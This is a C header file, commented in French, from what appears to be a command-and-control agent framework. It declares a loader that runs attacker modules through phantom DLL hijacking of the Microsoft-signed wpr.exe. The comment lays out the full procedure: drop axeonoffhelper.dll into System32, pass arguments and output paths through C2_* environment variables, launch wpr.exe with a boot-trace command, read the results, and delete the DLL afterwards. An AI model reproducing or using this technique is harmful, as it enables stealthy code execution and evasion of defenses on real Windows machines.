/*
 * ============================================================
 *  wpr_loader.h - Phantom DLL via wpr.exe (T1574.002)
 *
 *  Charge un module DLL en exploitant le "phantom DLL hijacking"
 *  de wpr.exe (Windows Performance Recorder, signe Microsoft) :
 *
 *  1. Verifie les droits administrateur (System32 en ecriture)
 *  2. Ecrit la DLL dans C:\Windows\System32\axeonoffhelper.dll
 *  3. Passe les args via env var  C2_ARGS_HEX   (hex little-endian)
 *  4. Signale le mode WPR via env var C2_WPR_MODE = 1
 *  5. Definit la sortie via env var C2_OUTPUT_FILE (<temp>.bin)
 *  6. Lance : wpr.exe -boottrace -stopboot foo
 *     > wpr.exe appelle LoadLibrary("axeonoffhelper.dll")
 *     > DllMain detecte C2_WPR_MODE=1, execute go(), ecrit la sortie
 *  7. Attend la fin du processus (timeout 30s)
 *  8. Lit C2_OUTPUT_FILE > module_result_t
 *  9. Supprime axeonoffhelper.dll + fichier de sortie
 *
 *  Le DllMain C2 est defini dans beacon_compatibility.c
 *  (compile dans chaque DLL module avec -DRDLL_MODE).
 *
 *  MITRE ATT&CK : T1574.002 - DLL Side-Loading (Phantom DLL)
 * ============================================================
 */
#ifndef WPR_LOADER_H
#define WPR_LOADER_H

#include "execution_engine.h"

/*
 * Charge et execute une DLL module via le phantom DLL hijacking wpr.exe.
 *
 * @param dll_bytes : bytes bruts de la DLL (.dll PE64)
 * @param dll_size  : taille en bytes
 * @param args      : arguments packes pour go() (format BeaconDataParse)
 * @param args_len  : taille des arguments (0 si aucun)
 * @return module_result_t - appeler free_module_result() apres usage
 *
 * Prerequis : processus agent doit tourner avec token eleve (admin).
 */
module_result_t wpr_loader_execute(
    const unsigned char *dll_bytes, size_t dll_size,
    const unsigned char *args,      size_t args_len
);

#endif /* WPR_LOADER_H */
